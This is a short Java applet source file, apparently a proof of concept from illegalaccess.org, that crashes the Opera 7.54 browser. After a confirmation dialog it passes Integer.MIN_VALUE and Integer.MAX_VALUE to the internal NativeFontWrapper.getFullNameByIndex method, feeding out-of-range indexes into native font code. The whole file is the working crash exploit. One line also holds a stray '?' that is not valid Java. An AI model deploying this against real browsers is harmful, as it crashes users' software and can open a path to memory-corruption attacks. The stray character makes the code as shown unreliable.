import sun.awt.font.*;

public class Opera754FontCrashApplet extends java.applet.Applet{

	public void start() {
		int j =
		javax.swing.JOptionPane.showConfirmDialog(null,"Illegalaccess.org | Step1 Opera 754 FontCrash, wanna crash? ");
		if (j == 0)? {
			NativeFontWrapper.getFullNameByIndex(Integer.MIN_VALUE);
			NativeFontWrapper.getFullNameByIndex(Integer.MAX_VALUE);
		}
	}
}
